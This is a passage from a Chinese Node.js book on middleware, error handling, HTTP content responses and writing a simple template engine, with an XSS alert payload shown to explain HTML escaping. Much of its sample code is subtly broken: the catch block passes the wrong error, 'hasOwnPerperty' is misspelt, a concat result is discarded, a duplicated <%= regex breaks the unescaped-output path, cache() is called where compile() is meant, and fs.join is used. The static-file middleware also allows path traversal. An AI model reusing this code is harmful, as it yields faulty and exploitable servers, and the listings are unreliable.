app.put('/user/:username', authorize, updateUser);
```
为了满足更灵活的设计，这里持续改进我们的use()方法以适应参数的变化，如下所示：

```js
app.use = function(path) {
  var handle;
  if (typeof path === 'string') {
    handle = {
      // 第一个参数作为路径 
      path: pathRegexp(path),
      // 其他的都是处理单元 
      stack: Array.prototype.slice.call(arguments, 1)
    };
  } else {
    handle = {
      // 第一个参数作为路径 
      path: pathRegexp('/'),
      // 其他的都是处理单元 
      stack: Array.prototype.slice.call(arguments, 0)
    };
  }
  routes.all.push(handle);
};
```
除了改进use()方法外，还要持续改进我们的匹配过程，与前面一旦一次匹配后就不再执行后续匹配不同，还会继续后续逻辑，这里我们将所有匹配到中间件的都暂时保存起来，如下所示：

```js
var match = function(pathname, routes) {
  var stacks = [];
  for (var i = 0; i < routes.length; i++) {
    var route = routes[i]; // 正则匹配 
    var reg = route.path.regexp;
    var matched = reg.exec(pathname);
    if (matched) {
      // 抽取具体值 
      // 代码省略 
      // 将中间件都保存起来 
      stacks = stacks.concat(route.stack);
    }
  }
  return stacks;
};
```
改进完use()方法后，还要持续改进分发的过程：

```js
function(req, res) {
  var pathname = url.parse(req.url).pathname;
  // 将请求方法变为小写 
  var method = req.method.toLowerCase();
  // 获取all()方法里的中间件 var stacks = match(pathname, routes.all); 
  if (routes.hasOwnPerperty(method)) { // 根据请求方法分发，获取相关的中间件 
    stacks.concat(match(pathname, routes[method]));
  }
  if (stacks.length) {
    handle(req, res, stacks);
  } else {
    // 处理404请求 
    handle404(req, res);
  }
}
```
综上所述，通过中间件和路由的协作，我们不知不觉之间已经将复杂的事情简化下来，Web应用开发者可以只关注业务开发就能胜任整个开发工作。

#### 异常处理

但是等等，如果某个中间件出现错误该怎么办？我们需要为自己构建的Web应用的稳定性和健壮性负责。于是我们为next()方法添加err参数，并捕获中间件直接抛出的同步异常，如下所示：

```js
var handle = function(req, res, stack) {
  var next = function(err) {
    if (err) {
      return handle500(err, req, res, stack);
    } // 从stack数组中取出中间件并执行 
    var middleware = stack.shift();
    if (middleware) {
      // 传入next()函数自身，使中间件能够执行结束后递归 
      try {
        middleware(req, res, next);
      } catch(ex) {
        next(err);
      }
    }
  };
  // 启动执行 
  next();
};
```
由于异步方法的异常不能直接捕获（在第4章中有过阐述），中间件异步产生的异常需要自己传递出来，如下所示：

```js
var session = function(req, res, next) {
  var id = req.cookies.sessionid;
  store.get(id,
  function(err, session) {
    if (err) { // 将异常通过next()传递 
      return next(err);
    }
    req.session = session;
    next();
  });
};
```
Next()方法接到异常对象后，会将其交给handle500()进行处理。为了将中间件的思想延续下去，我们认为进行异常处理的中间件也是能进行数组式处理的。由于要同时传递异常，所以用于处理异常的中间件的设计与普通中间件略有差别，它的参数有4个，如下所示：

```js
var middleware = function (err, req, res, next) { 
  // TODO 
  next(); 
};
```
我们通过use()可以将所有异常处理的中间件注册起来，如下所示：

```
app.use(function (err, req, res, next) { 
  // TODO 
});
```
为了区分普通中间件和异常处理中间件，handle500()方法将会对中间件按参数进行进行选取，然后递归执行。

```js
var handle500 = function(err, req, res, stack) { // 选取异常处理中间件 
  stack = stack.filter(function(middleware) {
    return middleware.length === 4;
  });
  var next = function() { // 从stack数组中取出中间件并执行 
    var middleware = stack.shift();
    if (middleware) {
      // 传递异常对象 
      middleware(err, req, res, next);
    }
  };
  // 启动执行 
  next();
};
```
#### 中间件与性能

前文我们添加了强大的中间件组织能力，如果注意到一个现象的话，那就是我们的业务逻辑往往是在最后才执行。为了让业务逻辑提早执行，尽早响应给终端用户，中间件的编写和使用是需要一番考究的。下面是两个主要的能提升的点。

- 编写高效的中间件。
- 合理利用路由，避免不必要的中间件执行。

1. 编写高效的中间件

编写高效的中间件其实就是提升单个处理单元的处理速度，以尽早调用next()执行后续逻辑。需要知道的事情是，一旦中间件被匹配，那么每个请求都会使该中间件执行一次，哪怕它只浪费1毫秒的执行时间，都会让我们的QPS显著下降。常见的优化方法有几种。

- 使用高效的方法。必要时通过jsperf.com测试基准性能。
- 缓存需要重复计算的结果（需要控制缓存用量，原因在第5章阐述过）。
- 避免不必要的计算。比如HTTP报文体的解析，对于GET方法完全不需要。

2. 合理使用路由

在拥有一堆高效的中间件后，并不意味着每个中间件我们都使用，合理的路由使得不必要的中间件不参与请求处理的过程。这里以一个示例来说明该问题。

假设我们这里有一个静态文件的中间件，它会对请求进行判断，如果磁盘上存在对应文件，就响应对应的静态文件，否则就交由下游中间件处理，如下所示：

```js
var staticFile = function(req, res, next) {
  var pathname = url.parse(req.url).pathname;
  fs.readFile(path.join(ROOT, pathname),
  function(err, file) {
    if (err) {
      return next();
    }
    res.writeHead(200);
    res.end(file);
  });
};
```
如果我们以如下的方式注册路由：

```js
app.use(staticFile);
```
那么意味着对/路径下的所有URL请求都会进行判断。又由于它中间涉及到了磁盘I/O，如果成功匹配，它的效率还行，但是如果不成功匹配，每次的磁盘I/O都是对性能的浪费，使QPS直线下降。

对于这种情况，我们需要做的是提升匹配成功率，那么就不能使用默认的/路径来进行匹配了，因为它的误伤率太高。给它添加一个更好的路由路径是个不错的选择，如下所示：

```js
app.use('/public', staticFile);
```
这样只有/public路径会匹配上，其余路径根本不会涉及该中间件。

#### 小结

中间件使得前文的基础功能，从凌乱的发散状态收敛成很规整的组织方式。对于单个中间件而言，它足够简单，职责单一。与像面条一样杂糅在一起的逻辑判断相比，它具备更好的可测试性。中间件机制使得Web应用具备良好的可扩展性和可组合性，可以轻易地进行数据增删。从某种角度来讲它就是Unix哲学的一个实现，专注简单，小而美，然后通过组合使用，发挥出强大的能量。

中间件是Connect的经典模式，通过本节的叙述，我们已经可以看到整个Connect是如何搭建轮廓的。本节试图解释Web开发过程的前置思路，省略了许多细节，尽管与实际的Connect代码不尽相同，希望借着这些思路，每位开发者都能独立写出适应自己业务需求的框架。

### 页面渲染

通过中间件机制组织基础功能完成我们的请求预处理后，不管是通过MVC还是通过RESTful路由，开发者或者是调用了数据库，或者是进行了文件操作，或者是处理了内存，这时我们终于来到了响应客户端的部分了。这里的“页面渲染”是个狭义的标题，我们其实响应的可能是一个HTML网页，也可能是CSS、JS文件，或者是其他多媒体文件。这里我们要承接上文谈论的HTTP响应实现的技术细节，主要包含内容响应和页面渲染两个部分。

对于过去流行的ASP、PHP、JSP等动态网页技术，页面渲染是一种内置的功能。但对于Node来说，它并没有这样的内置功能，在本节的介绍中，你会看到正是因为标准功能的缺失，我们可以更贴近底层，发展出更多更好的渲染技术，社区的创造力使得Node在HTTP响应上呈现出更加丰富多彩的状态。

#### 内容响应

在第7章我们介绍了http模块封装了对请求报文和响应报文的操作，在这里我们则展开说明应用层该如何使用响应的封装。服务器端响应的报文，最终都要被终端处理。这个终端可能是命令行终端，也可能是代码终端，也可能是浏览器。服务器端的响应从一定程度上决定或指示了客户端该如何处理响应的内容。

内容响应的过程中，响应报头中的Content-*字段十分重要。在下面的示例响应报文中，服务端告知客户端内容是以gzip编码的，其内容长度为21 170个字节，内容类型为JavaScript，字符集为UTF-8：

```
Content-Encoding: gzip 
Content-Length: 21170 
Content-Type: text/javascript; 
charset=utf-8
```
客户端在接收到这个报文后，正确的处理过程是通过gzip来解码报文体中的内容，用长度校验报文体内容是否正确，然后再以字符集UTF-8将解码后的脚本插入到文档节点中。

1. MIME

如果想要客户端用正确的方式来处理响应内容，了解MIME必不可少。可以先猜想一下下面两段代码在客户端会有什么样的差异：

```js
res.writeHead(200, {'Content-Type': 'text/plain'}); 
res.end('<html><body>Hello World</body></html>\n'); 
// 或者 
res.writeHead(200, {'Content-Type': 'text/html'}); 
res.end('<html><body>Hello World</body></html>\n');
```
在网页中，前者显示的是 `<html><body>Hello World</body></html>` ，而后者只能看到Hello World，如图8-5所示。

![Content-Type字段值不同使网页显示的内容不同](https://graphbed.qiniu.songxingguo.com/Node-Web-App/Content-Type%E5%AD%97%E6%AE%B5%E5%80%BC%E4%B8%8D%E5%90%8C%E4%BD%BF%E7%BD%91%E9%A1%B5%E6%98%BE%E7%A4%BA%E7%9A%84%E5%86%85%E5%AE%B9%E4%B8%8D%E5%90%8C.jpg)

没错，引起上述差异的原因就在于它们的Content-Type字段的值是不同的。浏览器对内容采用了不同的处理方式，前者为纯文本，后者为HTML，并渲染了DOM树。浏览器正是通过不同的Content-Type的值来决定采用不同的渲染方式，这个值我们简称为MIME值。

MIME的全称是Multipurpose Internet Mail Extensions，从名字可以看出，它最早用于电子邮件，后来也应用到浏览器中。不同的文件类型具有不同的MIME值，如JSON文件的值为application/json、XML文件的值为application/xml、PDF文件的值为application/pdf。

为了方便获知文件的MIME值，社区有专有的mime模块可以用判段文件类型。它的调用十分简单，如下所示：

```js
var mime = require('mime'); 
mime.lookup('/path/to/file.txt'); // => 'text/plain' 
mime.lookup('file.txt'); // => 'text/plain' 
mime.lookup('.TXT'); // => 'text/plain' 
mime.lookup('htm'); // => 'text/html'
```
除了MIME值外，Content-Type的值中还可以包含一些参数，如字符集。示例如下：

```
Content-Type: text/javascript; 
charset=utf-8
```
2. 附件下载

在一些场景下，无论响应的内容是什么样的MIME值，需求中并不要求客户端去打开它，只需弹出并下载它即可。为了满足这种需求，Content-Disposition字段应声登场。
Content-Disposition字段影响的行为是客户端会根据它的值判断是应该将报文数据当做即时浏览的内容，还是可下载的附件。当内容只需即时查看时，它的值为inline，当数据可以存为附件时，它的值为attachment。另外，Content-Disposition字段还能通过参数指定保存时应该使用的文件名。示例如下：

```
Content-Disposition: attachment; 
filename="filename.ext"
```
如果我们要设计一个响应附件下载的API（res.sendfile），我们的方法大致是如下这样的：

```js
res.sendfile = function(filepath) {
  fs.stat(filepath,
  function(err, stat) {
    var stream = fs.createReadStream(filepath);
    // 设置内容 
    res.setHeader('Content-Type', mime.lookup(filepath)); 
    // 设置长度 
    res.setHeader('Content-Length', stat.size); 
    // 设置为附件 
    res.setHeader('Content-Disposition' 'attachment; filename="' + path.basename(filepath) + '"'); 
    res.writeHead(200);
    stream.pipe(res);
  });
};
```
3. 响应JSON

为了快捷地响应JSON数据，我们也可以如下这样进行封装：

```js
res.json = function (json) { 
  res.setHeader('Content-Type', 'application/json'); 
  res.writeHead(200); 
  res.end(JSON.stringify(json)); 
};
```
4. 响应跳转

当我们的URL因为某些问题（譬如权限限制）不能处理当前请求，需要将用户跳转到别的URL时，我们也可以封装出一个快捷的方法实现跳转，如下所示：

```js
res.redirect = function (url) { 
  res.setHeader('Location', url); 
  res.writeHead(302); 
  res.end('Redirect to ' + url); 
};
```
#### 视图渲染

Web应用的内容响应形式十分丰富，可以是静态文件内容，也可以是其他附件文件，也可以是跳转等。这里我们回到主流的普通的HTML内容的响应上，总称视图渲染。Web应用最终呈现在界面上的内容，都是通过一系列的视图渲染呈现出来的。在动态页面技术中，最终的视图是由模板和数据共同生成出来的。

模板是带有特殊标签的HTML片段，通过与数据的渲染，将数据填充到这些特殊标签中，最后生成普通的带数据的HTML片段。通常我们将渲染方法设计为render()，参数就是模板路径和数据，如下所示：

```js
res.render = function (view, data) { 
  res.setHeader('Content-Type', 'text/html'); 
  res.writeHead(200); 
  // 实际渲染 
  var html = render(view, data); 
  res.end(html); 
};
```
在Node中，数据自然是以JSON为首选，但是模板却有太多选择可以使用了。上面代码中的render()我们可以将其看成是一个约定接口，接受相同参数，最后返回HTML片段。这样的方法我们都视作实现了这个接口。

#### 模板

最早的服务器端动态页面开发，是在CGI程序或servlet中输出HTML片段，通过网络流输出到客户端，客户端将其渲染到用户界面上。这种逻辑代码与HTML输出的代码混杂在一起的开发方式，导致一个小小的UI改动都要大动干戈，甚至需要重新编译。为了改良这种情况，使HTML与逻辑代码分离开来，催生出一些服务器端动态网页技术，如ASP、PHP、JSP。它们将动态语言部分通过特殊的标签（ASP和JSP以 <% %> 作为标志，PHP则以   <? ?> 作为标志）包含起来，通过HTML和模板标签混排，将开发者从输出HTML的工作中解脱出来。这样的方法虽然一定程度上减轻了开发维护的难度，但是页面里还是充斥着大量的逻辑代码。这催生了MVC在动态网页技术中的发展，MVC将逻辑、显示、数据分离开来的方式，大大提高了项目的可维护性。其中模板技术就在这样的发展中逐渐成熟起来的。

尽管模板技术看起来在MVC时期才广泛使用，但不可否认的是如ASP、PHP、JSP，它们其实就是最早的模板技术。模板技术虽然多种多样，但它的实质就是将模板文件和数据通过模板引擎生成最终的HTML代码。形成模板技术的也就如下4个要素。

- 模板语言。
- 包含模板语言的模板文件。
- 拥有动态数据的数据对象。
- 模板引擎。

对于ASP、PHP、JSP而言，模板属于服务器端动态页面的内置功能，模板语言就是它们的宿主语言（VBScript、JScript、PHP、Java），模板文件就是以.php、.asp、.jsp为后缀的文件，模板引擎就是Web容器。

这个时期的模板极度依赖上下文，甚至要处理整个HTTP的请求对象。随后模板语言的发展使得模板可以脱离上下文环境，只有数据对象就可以执行。如PHP中的PHPLIB Template和FastTemplate、Java的XSTL，以及Velocity、JDynamiTe、Tapestry等模板。

这类模板的缺点在于它的实现与宿主语言有很大的关联性，由于各种语言采用的模板语言不同，包含各种特殊标记，导致移植性较差。早期的企业一旦选定编程语言就不会轻易地转换环境，所以较少有开发者去开发新的模板语言和模板引擎来适应不同的编程语言。如今异构系统越来越多，模板能够应用到多门编程语言中的这种需求也开始呈现出来。

破局者是Mustache，它宣称自己是弱逻辑的模板（logic-less templates），定义了以 **双大括号** 为标志的一套模板语言，并给出了十多门编程语言的模板引擎实现，使得采用它作为模板具备很好的可移植性。但随着Node在社区的发展，思路很快被打开，模板语言可以随意创造，模板引擎也可以随意实现。Node社区目前与模板引擎相关模块的列表差不多要滚3个屏幕才能看完。并且由于Node与前端都采用相同的执行语言JavaScript，所以一套模板语言也无须为它编写两套不同的模板引擎就能轻松地跨前后端共用。

模板和数据与最终结果相比，这里有一个静态、动态的划分过程，相同的模板和不同的数据可以得到不同的结果，不同的模板与相同的数据也能得到不同的结果。模板技术使得网页中的动态内容和静态内容变得不互相依赖，数据开发者与模板开发者只要约定好数据结构，两者就不用互相影响了，如下图所示。

![模板技术](https://graphbed.qiniu.songxingguo.com/Node-Web-App/%E6%A8%A1%E6%9D%BF%E6%8A%80%E6%9C%AF.jpg)

但模板技术并不是什么神秘的技术，它干的实际上是拼接字符串这样很底层的活，只是各种模板有着各自的优缺点和技巧。说模板是拼接字符串并不为过，我们要的就是模板加数据，通过模板引擎的执行就能得到最终的HTML字符串这样结果。

假设我们的模板是如下这样的，   就是我们制定的模板标签（选择这个标签主要因为ASP和JSP都采用它做标签，相对熟悉）：

```
Hello <%= username%>
```
如果我们的数据是{username: "JacksonTian"}，那么我们期望的结果就是Hello JacksonTian。具体实现的过程是模板分为Hello和 <%= username%> 两个部分，前者为普通字符串，后者是表达式。表达式需要继续处理，与数据关联后成为一个变量值，最终将字符串与变量值连成最终的字符串。下图演示了模板与数据的渲染过程图。

![模板与数据的渲染过程](https://graphbed.qiniu.songxingguo.com/Node-Web-App/%E6%A8%A1%E6%9D%BF%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%9A%84%E6%B8%B2%E6%9F%93%E8%BF%87%E7%A8%8B.jpg)

1. 模板引擎

为了演示模板引擎的技术，我们将通过render()方法实现一个简单的模板引擎。这个模板引擎会将Hello <%= username%>转换为"Hello " + obj.username。该过程进行以下几个步骤。

- 语法分解。提取出普通字符串和表达式，这个过程通常用正则表达式匹配出来，<%=%>的正则表达式为/<%=([\s\S]+?)%>/g。
- 处理表达式。将标签表达式转换成普通的语言表达式。
- 生成待执行的语句。
- 与数据一起执行，生成最终字符串。

知晓了流程，模板函数就可以轻松愉快地开工了，如下所示：

```js
var render = function(str, data) { // 模板技术呢，就是替换特殊标签的技术 
  var tpl = str.replace(/<%=([\s\S]+?)%>/g,
  function(match, code) {
    return "' + obj." + code + "+ '";
  });
  tpl = "var tpl = '" + tpl + "'\nreturn tpl;";
  var complied = new Function('obj', tpl);
  return complied(data);
};
```
调用上面的模板函数试试，如下所示：

```js
var tpl = 'Hello <%=username%>.';
console.log(render(tpl, {
  username: 'Jackson Tian'
}));
// => Hello Jackson Tian.
```
模板编译

上述代码的实现过程中，可以看到有部分内容前文没有提及，它的内容如下：

```js
tpl = "var tpl = '" + tpl + "'\nreturn tpl;"; 
var complied = new Function('obj', tpl);
```
为了能够最终与数据一起执行生成字符串，我们需要将原始的模板字符串转换成一个函数对象。比如Hello <%=username%>这句模板字符串，最终会生成如下的代码：

```js
function(obj) {
  var tpl = 'Hello ' + obj.username + '.';
  return tpl;
}
```
这个过程称为模板编译，生成的中间函数只与模板字符串相关，与具体的数据无关。如果每次都生成这个中间函数，就会浪费CPU。为了提升模板渲染的性能速度，我们通常会采用模板预编译的方式。是故，上面的代码可以拆解为两个方法，如下所示：

```js
var complie = function(str) {
  var tpl = str.replace(/<%=([\s\S]+?)%>/g,
  function(match, code) {
    return "' + obj." + code + "+ '";
  });
  tpl = "var tpl = '" + tpl + "'\nreturn tpl;";
  return new Function('obj, escape', tpl);
};
var render = function(complied, data) {
  return complied(data);
};
```
通过预编译缓存模板编译后的结果，实际应用中就可以实现一次编译，多次执行，而原始的方式每次执行过程中都要进行一次编译和执行。

2. with的应用

上面实现的模板引擎非常弱，只能替换变量，<%="Jackson Tian"%>就无法支持了。为了让它更灵活，我们需要改进它的实现，使字符串能继续表达为字符串，变量能够自动寻找属于它的对象。于是with关键字引入到我们的实现中。with关键字是JavaScript中饱受Douglas Crockford指责的设计，细节在本书附录C中有详细描述。但在这里，with关键字可以得到很方便的应用。

```js
var complie = function(str, data) {
  // 模板技术呢，就是替换特殊标签的技术 
  var tpl = str.replace(/<%=([\s\S]+?)%>/g,
  function(match, code) {
    return "' + " + code + "+ '";
  });
  tpl = "tpl = '" + tpl + "'";
  tpl = 'var tpl = "";\nwith (obj) {' + tpl + '}\nreturn tpl;';
  return new Function('obj', tpl);
};
```
普通字符串就直接输出，变量code的值则是obj[code]。关于new Function()，这里通过它创建了一个函数对象，它的语法如下：

```js
new Function ([arg1[, arg2[, ... argN]],] functionBody)
```
Function()构造函数接受多个参数，最后一个参数作为函数体的内容，其余参数都会用来作为新生成的函数的参数列表。

模板安全

前文提到过XSS漏洞，它的产生大多跟模板相关，如果上文中的username的值为`<script>alert("I am XSS.")</script>`，那么模板渲染输出的字符串将会是：

```js
Hello <script>alert("I am XSS.")</script>.
```
这会在页面上执行这个脚本，如果恰好这里的username是在URL的查询字符上输入的，这就构成了XSS漏洞。为了提高安全性，大多数模板都提供了转义的功能。转义就是将能形成HTML标签的字符转换成安全的字符，这些字符主要有&、<、>、"、'。转义函数如下：

```js
var escape = function(html) {
  return String(html).replace(/&(?!\w+;)/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#039;'); // IE下不支持&apos;（单引号）转义 
};
​````
不确定要输出HTML标签的字符最好都转义，为了让转义和非转义表现得更方便，<%=%>和<%-%>分别表示为转义和非转义的情况，如下所示：

​```js
var render = function(str, data) {
  var tpl = str.replace(/\n/g, '\\n') // 将换行符替换 
  .replace(/<%=([\s\S]+?)%>/g,
  function(match, code) {
    // 转义 
    return "' + escape(" + code + ") + '";
  }).replace(/<%=([\s\S]+?)%>/g,
  function(match, code) { // 正常输出 
    return "' + " + code + "+ '";
  });
  tpl = "tpl = '" + tpl + "'";
  tpl = 'var tpl = "";\nwith (obj) {' + tpl + '}\nreturn tpl;';
  // 加上escape()函数 
  return new Function('obj', 'escape', tpl);
};
```
模板引擎通过正则分别匹配-和=并区别对待，最后不要忘记传入escape()函数。最终上面的危险代码会转换为安全的输出，如下所示：

```
Hello &lt;script&gt;alert(&quot;I am XSS.&quot;)&lt;/script&gt;.
```
因此，在模板技术的使用中，时刻不要忘记转义，尤其是与输入有关的变量一定要转义。

3. 模板逻辑

尽管模板技术已经将业务逻辑与视图部分分离开来，但是视图上还是会存在一些逻辑来控制页面的最终渲染。为了让上述模板变得强大一点，我们为它添加逻辑代码，使得模板可以像ASP、PHP那样控制页面渲染。譬如下面的代码，结果HTML与输入数据相关：

```
<% if (user) { %> 
<h2><%= user.name %></h2> <% } else { %> 
<h2>匿名用户</h2> <% } %>
```
它要编译成的函数应该是如下这样的：

```js
function(obj, escape) {
  var tpl = "";
  with(obj) {
    if (user) {
      tpl += "<h2>" + escape(user.name) + "</h2>";
    } else {
      tpl += "<h2>匿名用户</h2>";
    }
  }
  return tpl;
}
```
模板引擎拼接字符串的原理还是通过正则表达式进行匹配替换，如下所示：

```js
var complie = function(str) {
  var tpl = str.replace(/\n/g, '\\n') // 将换行符替换 
  .replace(/<%=([\s\S]+?)%>/g,
  function(match, code) {
    // 转义 
    return "' + escape(" + code + ") + '";
  }).replace(/<%=([\s\S]+?)%>/g,
  function(match, code) { // 正常输出 
    return "' + " + code + "+ '";
  }).replace(/<%([\s\S]+?)%>/g,
  function(match, code) {
    // 可执行代码 
    return "';\n" + code + "\ntpl += '";
  }).replace(/\'\n/g, '\'').replace(/\n\'/gm, '\'');
  tpl = "tpl = '" + tpl + "';";
  // 转换空行 
  tpl = tpl.replace(/''/g, '\'\\n\'');
  tpl = 'var tpl = "";\nwith (obj || {}) {\n' + tpl + '\n}\nreturn tpl;';
  return new Function('obj', 'escape', tpl);
};
```
完成上面的实现后，试试成果，如下所示：

```js
var tpl = ['<% if (user) { %>', '<h2><%=user.name%></h2>', '<% } else { %>', '<h2>匿名用户</h2>', '<% } %>'].join('\n');
render(complie(tpl), {
  user: {
    name: 'Jackson Tian'
  }
});
```
得到的输出内容如下所示：

```html
<h2>Jackson Tian</h2>
```
接下来在不传递user时试试，如下所示：

```js
render(complie(tpl), {});
```
结果是遗憾地得到异常信息，如下所示：

```
undefined:5 if (user) { 
^ ReferenceError: user is not defined
```
为了程序的健壮性，需要将模板写得健壮一点，对于不确定是否存在的属性，应该为它加上引用，如下所示：

```js
var tpl = ['<% if (obj.user) { %>', '<h2><%=user.name%></h2>', '<% } else { %>', '<h2>匿名用户</h2>', '<% } %>'].join('\n');
```
EJS中，它的变量不是obj，而是locals，这里的值与模板引擎中的with语句有关。重新执行上面的示例，得到的结果为：

```html
<h2>匿名用户</h2>
```
此外，实现了执行表达式的模板引擎还能进行循环，如下所示：

```js
var tpl = ['<% for (var i = 0; i < items.length; i++) { %>', '<%var item = items[i];%>', '<p><%= i+1 %>、<%=item.name%></p>', '<% } %>'].join('\n');
render(complie(tpl), {
  items: [{
    name: 'Jackson'
  },
  {
    name: '朴灵'
  }]
});
```
得到的输出如下所示：

```html
<p>1、Jackson</p> 
<p>2、朴灵</p>
```
如此，我们实现的模板引擎已经能够处理输出和逻辑了，视图的渲染逻辑不成问题。

4. 集成文件系统

前文我们实现的complie()和render()函数已经能够实现将输入的模板字符串进行编译和替换的功能。如果与前文的HTTP响应对象组合起来处理的话，我们响应一个客户端的请求大致如下：

```js
app.get('/path',
function(req, res) {
  fs.readFile('file/path', 'utf8',
  function(err, text) {
    if (err) {
      res.writeHead(500, {
        'Content-Type': 'text/html'
      });
      res.end('模板文件错误');
      return;
    }
    res.writeHead(200, {
      'Content-Type': 'text/html'
    });
    var html = render(complie(text), data);
    res.end(html);
  });
});
```
这样的响应体验并不友好，其缺点有如下几点。

- 每次请求需要反复读磁盘上的模板文件。
- 每次请求需要编译。
- 调用烦琐。

如果你记性不差的话，应该知道大多数的MVC框架在做渲染时都只有一个简单的render()方法，所以我们也需要一个更简洁、性能更好的render()函数，如下所示：

```js
var cache = {};
var VIEW_FOLDER = '/path/to/wwwroot/views';
res.render = function(viewname, data) {
  if (!cache[viewname]) {
    var text;
    try {
      text = fs.readFileSync(path.join(VIEW_FOLDER, viewname), 'utf8');
    } catch(e) {
      res.writeHead(500, {
        'Content-Type': 'text/html'
      });
      res.end('模板文件错误');
      return;
    }
    cache[viewname] = complie(text);
  }
  var complied = cache[viewname];
  res.writeHead(200, {
    'Content-Type': 'text/html'
  });
  var html = complied(data);
  res.end(html);
};
```
这个res.render()实现中，虽然有同步读取文件的情况，但是由于采用了缓存，只会在第一次读取的时候造成整个进程的阻塞，一旦缓存生效，将不会反复读取模板文件。其次，缓存之前已经进行了编译，也不会每次读取都编译。

封装完渲染函数之后，我们的调用就很轻松了，如下所示：

```js
app.get('/path', function (req, res) { 
  res.render('viewname', {}); 
});
```
与文件系统集成之后，再引入缓存，可以很好地解决性能问题，接口也大大得到简化。由于模板文件内容都不太大，也不属于动态改动的，所以使用进程的内存来缓存编译结果，并不会引起太大的垃圾回收问题。

5. 子模板

有时候模板文件太大，太过复杂，会增加维护上的难度，而且有些模板是可以重用的，这催生了子模板（Partial View）的产生。子模板可以嵌套在别的模板中，多个模板可以嵌入同一个子模板中。维护多个子模板比维护完整而复杂的大模板的成本要低很多，很多复杂问题可以降解为多个小而简单的问题。

这里我们采用include关键字来实现模板的嵌套。假设母模板如下：


```html
<ul> 
  <% users.forEach(function(user){ %> 
     <% include user/show %> 
  <% }) %> 
</ul>
```
子模板user/show内容如下：

```html
<li><%=user.name%></li>
```
渲染出来的效果应当跟以下代码渲染出来的效果别无二致：

```html
<ul> 
  <% users.forEach(function(user){ %> 
    <li><%=user.name%></li> 
  <% }) %> 
</ul>
```
所以实现子模板的诀窍就是先将include语句进行替换，再进行整体性编译，如下所示：

```
var files = {};
var preComplie = function(str) {
  var replaced = str.replace(/<%\s+(include.*)\s+%>/g,
  function(match, code) {
    var partial = code.split(/\s/)[1];
    if (!files[partial]) {
      files[partial] = fs.readFileSync(fs.join(VIEW_FOLDER, partial), 'utf8');
    }
    return files[partial];
  });
  // 多层嵌套，继续替换 
  if (str.match(/<%\s+(include.*)\s+%>/)) {
    return preComplie(replaced);
  } else {
    return replaced;
  }
};
```
然后我们改进一下complie()函数，在正式编译前进行子模板替换，如下所示：

```js
var complie = function(str) { 
  // 预解析子模板 
  str = preComplie(str);
  var tpl = str.replace(/\n/g, '\\n') 
   // 将换行符替换 
  .replace(/<%=([\s\S]+?)%>/g,
  function(match, code) { // 转义 
    return "' + escape(" + code + ") + '";
  }).replace(/<%=([\s\S]+?)%>/g,
  function(match, code) {
    // 正常输出 
    return "' + " + code + "+ '";
  }).replace(/<%([\s\S]+?)%>/g,
  function(match, code) { 
    // 可执行代码 
    return "';\n" + code + "\ntpl += '";
  }).replace(/\'\n/g, '\'').replace(/\n\'/gm, '\'');
  tpl = "tpl = '" + tpl + "';"; 
  // 转换空行 
  tpl = tpl.replace(/''/g, '\'\\n\'');
  tpl = 'var tpl = "";\nwith (obj || {}) {\n' + tpl + '\n}\nreturn tpl;';
  return new Function('obj', 'escape', tpl);
};
```
6. 布局视图

子模板主要是为了重用模板和降低模板的复杂度。子模板的另一种使用方式就是布局视图（layout），布局视图又称母版页，它与子模板的原理相同，但是场景稍有区别。一般而言模板指定了子模板，那它的子模板就无法进行替换了，子模板被嵌入到多个父模板中属于正常需求，但是如果在多个父模板中只是嵌入的子视图不同，模板内容却完全一样，也会出现重复。比如下面两个简单的父模板：

```html
// 模板1 
<ul> 
  <% users.forEach(function(user){ %> 
    <% include user/show %> 
  <% }) %> 
</ul> 
// 模板2 
<ul> 
   <% users.forEach(function(user){ %> 
     <% include profile %> 
   <% }) %> 
</ul>
```
这些重复的内容主要用来布局，为了能将这些布局模板重用起来，模板技术必须支持布局视图。支持布局视图之后，布局模板就只有一份，渲染视图时，指定好布局视图就可以了，如下所示：

```js
res.render('viewname', {
    layout: 'layout.html',
    users: []
});
```
对于布局模板文件，我们设计为将<%- body %>部分替换为我们的子模板，如下所示：

```html
<ul> 
  <% users.forEach(function(user){ %> 
    <%- body %> 
  <% }) %> 
</ul>
```
替换代码如下：

```js
var renderLayout = function(str, viewname) {
    return str.replace(/<%-\s*body\s*%>/g,
    function(match, code) {
        if (!cache[viewname]) {
            cache[viewname] = fs.readFileSync(fs.join(VIEW_FOLDER, viewname), 'utf8');
        }
        return cache[viewname];
    });
};
```
最终集成进res.render()函数，如下所示：

```js
res.render = function(viewname, data) {
    var layout = data.layout;
    if (layout) {
        if (!cache[layout]) {
            try {
                cache[layout] = fs.readFileSync(path.join(VIEW_FOLDER, layout), 'utf8');
            } catch(e) {
                res.writeHead(500, {
                    'Content-Type': 'text/html'
                });
                res.end('布局文件错误');
                return;
            }
        }
    }
    var layoutContent = cache[layout] || '<%-body%>';
    var replaced;
    try {
        replaced = renderLayout(layoutContent, viewname);
    } catch(e) {
        res.writeHead(500, {
            'Content-Type': 'text/html'
        });
        res.end('模板文件错误');
        return;
    }
    // 将模板和布局文件名做key缓存 
    var key = viewname + ':' + (layout || '');
    if (!cache[key]) { // 编译模板 
        cache[key] = cache(replaced);
    }
    res.writeHead(200, {
        'Content-Type': 'text/html'
    });
    var html = cache[key](data);
    res.end(html);
};如此，我们可以轻松地实现重用布局文件，如下所示：res.render('user', {
    layout: 'layout.html',
    users: []
}); // 或者 
res.render('profile', {
    layout: 'layout.html',
    users: []
});
```
7. 模板性能

从前文的实现细节中我们可以看到一些模板引擎的优化步骤，主要有如下几种。

- 缓存模板文件。
- 缓存模板文件编译后的函数。

完成上述两个步骤之后，渲染的性能与生成的函数直接相关，这个函数与模板字符串的复杂度有直接关系。如果在模板中编写了执行表达式，执行表达式的性能将直接影响模板的性能。优化执行表达式就是对模板性能的优化，所以加入一条优化步骤：

优化模板中的执行表达式

除了这几个常见的方案外，模板引擎的实现也与性能相关。本节的实现中采用了new Function()，事实上还可以使用eval()；对于字符串处理，本节中用的是字符串直接相加，有的模板引擎采用数组存储的方式，最后将所有字符串相连。对于变量的查找，本节采用的是with形成作用域的方式实现了查找，有的模板引擎采用了本节第一种方式，即指定变量名的方式（obj.username）查找，指定变量而不用with可以减少切换上下文。这些细节都是影响模板速度的因素。由于现有模板引擎数量巨多，此处不再做比较。

8. 小结

